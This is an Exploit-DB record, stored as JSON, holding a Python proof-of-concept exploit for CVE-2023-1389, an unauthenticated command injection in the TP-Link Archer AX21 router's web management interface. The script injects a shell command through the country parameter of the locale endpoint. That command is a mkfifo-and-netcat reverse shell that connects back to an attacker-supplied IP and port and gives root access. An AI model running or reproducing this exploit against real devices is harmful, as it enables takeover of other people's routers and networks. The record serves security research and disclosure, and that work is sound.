{"source": "https://www.exploit-db.com/exploits/51677", "vulnName": "TP-Link Archer AX21 - Unauthenticated Command Injection", "vulnEDBID": "51677", "vulnCVE": "2023-1389", "author": "VOYAG3R", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2023-08-10", "vulnContent": "#!/usr/bin/python3\n# \n# Exploit Title: TP-Link Archer AX21 - Unauthenticated Command Injection\n# Date: 07/25/2023\n# Exploit Author: Voyag3r (https://github.com/Voyag3r-Security)\n# Vendor Homepage: https://www.tp-link.com/us/\n# Version: TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 (https://www.tenable.com/cve/CVE-2023-1389)\n# Tested On: Firmware Version 2.1.5 Build 20211231 rel.73898(5553); Hardware Version Archer AX21 v2.0\n# CVE: CVE-2023-1389\n#\n# Disclaimer: This script is intended to be used for educational purposes only.\n# Do not run this against any system that you do not have permission to test. \n# The author will not be held responsible for any use or damage caused by this \n# program. \n# \n# CVE-2023-1389 is an unauthenticated command injection vulnerability in the web\n# management interface of the TP-Link Archer AX21 (AX1800), specifically, in the\n# *country* parameter of the *write* callback for the *country* form at the \n# \"/cgi-bin/luci/;stok=/locale\" endpoint. By modifying the country parameter it is \n# possible to run commands as root. Execution requires sending the request twice;\n# the first request sets the command in the *country* value, and the second request \n# (which can be identical or not) executes it. \n# \n# This script is a short proof of concept to obtain a reverse shell. To read more \n# about the development of this script, you can read the blog post here:\n# https://medium.com/@voyag3r-security/exploring-cve-2023-1389-rce-in-tp-link-archer-ax21-d7a60f259e94\n# Before running the script, start a nc listener on your preferred port -> run the script -> profit\n\nimport requests, urllib.parse, argparse\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\n# Suppress warning for connecting to a router with a self-signed certificate\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\n# Take user input for the router IP, and attacker IP and port\nparser = argparse.ArgumentParser()\n\nparser.add_argument(\"-r\", \"--router\", dest = \"router\", default = \"192.168.0.1\", help=\"Router name\")\nparser.add_argument(\"-a\", \"--attacker\", dest = \"attacker\", default = \"127.0.0.1\", help=\"Attacker IP\")\nparser.add_argument(\"-p\", \"--port\",dest = \"port\", default = \"9999\", help=\"Local port\")\n\nargs = parser.parse_args()\n\n# Generate the reverse shell command with the attacker IP and port\nrevshell = urllib.parse.quote(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc \" + args.attacker + \" \" + args.port + \" >/tmp/f\")\n\n# URL to obtain the reverse shell\nurl_command = \"https://\" + args.router + \"/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(\" + revshell + \")\"\n\n# Send the URL twice to run the command. Sending twice is necessary for the attack\nr = requests.get(url_command, verify=False)\nr = requests.get(url_command, verify=False)\n            "}